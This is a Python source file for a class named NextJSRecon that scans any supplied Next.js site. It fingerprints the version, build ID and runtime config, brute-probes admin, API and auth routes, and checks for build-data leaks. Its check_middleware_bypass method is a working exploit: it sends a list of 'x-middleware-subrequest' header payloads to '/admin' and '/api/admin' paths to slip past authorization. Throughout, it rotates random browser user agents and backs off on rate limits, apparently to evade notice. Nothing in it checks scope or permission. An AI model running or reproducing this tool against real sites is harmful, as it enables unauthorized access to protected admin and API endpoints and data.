import requests
import re
import json
import random
import time

USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
]

class NextJSRecon:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.results = {}
        self._initial_html = ''
        self._initial_headers = {}
        self._session = requests.Session()
        self._session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    def set_initial_response(self, html, headers):
        self._initial_html = html
        self._initial_headers = headers

    def _get(self, url, **kwargs):
        kwargs.setdefault('headers', {}).update({'User-Agent': random.choice(USER_AGENTS)})
        kwargs.setdefault('timeout', 15)
        for attempt in range(3):
            try:
                r = self._session.get(url, **kwargs)
                if r.status_code not in [429, 503]:
                    return r
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
            except requests.RequestException:
                if attempt == 2:
                    raise
                time.sleep(2)
        return self._session.get(url, **kwargs)

    def detect_version(self):
        text = self._initial_html
        if not text:
            try:
                response = self._get(self.target_url)
                text = response.text
            except:
                self.results['detected'] = False
                return self.results
        self.results['detected'] = '_next' in text or '__NEXT_DATA__' in text
        if self.results['detected']:
            build_id = re.search(r'"buildId":"([^"]+)"', text)
            if build_id:
                self.results['build_id'] = build_id.group(1)
            version = re.search(r'Next\.js\s+v?(\d+\.\d+\.\d+)', text, re.IGNORECASE)
            if version:
                self.results['version'] = version.group(1)
            next_data = re.search(r'__NEXT_DATA__\s*=\s*({.*?});', text, re.DOTALL)
            if next_data:
                try:
                    data = json.loads(next_data.group(1))
                    self.results['page'] = data.get('page', '')
                    self.results['runtime_config'] = data.get('runtimeConfig', {})
                    self.results['props'] = str(data.get('props', {}))[:500]
                except:
                    pass
            rsc = re.search(r'__RSC|RSC:', text)
            if rsc:
                self.results['react_server_components'] = True
            server_actions = re.findall(r'_next/server-actions/[^"\']+', text)
            if server_actions:
                self.results['server_actions'] = list(set(server_actions))
        return self.results

    def discover_routes(self):
        routes = [
            '/_next/static/', '/_next/image', '/_next/data/',
            '/api/', '/api/auth/', '/api/auth/session',
            '/api/users/', '/api/user/', '/api/admin/',
            '/_next/server-actions/',
            '/dashboard', '/admin', '/profile', '/settings', '/login', '/signup',
            '/_next/static/chunks/', '/_next/static/webpack/',
            '/_next/static/css/', '/_next/static/media/',
            '/_next/static/chunks/pages/',
        ]
        found = []
        for route in routes:
            try:
                url = f"{self.target_url}{route}"
                r = self._get(url, timeout=8, allow_redirects=False)
                if r.status_code not in [404, 502, 503]:
                    found.append({'route': route, 'status': r.status_code,
                                  'length': len(r.content)})
            except:
                pass
        self.results['routes'] = found
        return found

    def check_middleware_bypass(self):
        payloads = [
            'middleware:middleware:middleware:middleware:middleware',
            'middleware:middleware:middleware:middleware',
            'middleware:middleware:middleware',
            'middleware:middleware',
            'middleware:',
            'bypass',
            'true',
            '1',
        ]
        test_paths = ['/api/admin', '/admin', '/api/auth', '/api/protected']
        for path in test_paths:
            for payload in payloads:
                try:
                    r = self._get(f"{self.target_url}{path}",
                        timeout=8, allow_redirects=False,
                        headers={'x-middleware-subrequest': payload})
                    if r.status_code not in [404, 401, 403, 302]:
                        return True, {'payload': payload, 'path': path, 'status': r.status_code}
                except:
                    pass
        return False, None

    def check_ssg_ssr_leaks(self):
        leaks = []
        try:
            r = self._get(f"{self.target_url}/_next/data/", timeout=8)
            if r.status_code != 404:
                leaks.append('/_next/data/ accessible')
            r2 = self._get(f"{self.target_url}/404", timeout=8)
            build_id = re.search(r'"buildId":"([^"]+)"', r2.text)
            if build_id:
                leaks.append('Build ID leaked in 404 page')
                r3 = self._get(f"{self.target_url}/_next/data/{build_id.group(1)}/index.json", timeout=8)
                if r3.status_code == 200:
                    leaks.append('SSG data accessible via build ID')
        except:
            pass
        self.results['leaks'] = leaks
        return leaks

    def run_all(self):
        self.detect_version()
        self.discover_routes()
        bypass, details = self.check_middleware_bypass()
        self.results['middleware_bypass'] = bypass
        self.results['middleware_details'] = details
        self.check_ssg_ssr_leaks()
        return self.results
